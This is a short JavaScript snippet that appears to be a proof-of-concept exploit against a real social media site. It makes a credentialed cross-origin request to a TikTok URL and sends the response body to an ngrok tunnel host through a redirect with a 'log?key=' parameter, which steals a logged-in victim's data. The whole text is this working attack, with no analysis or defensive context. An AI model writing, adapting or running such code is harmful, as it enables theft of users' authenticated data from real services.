var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www.tiktok.com/t/ZSLQ2gyc5/");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
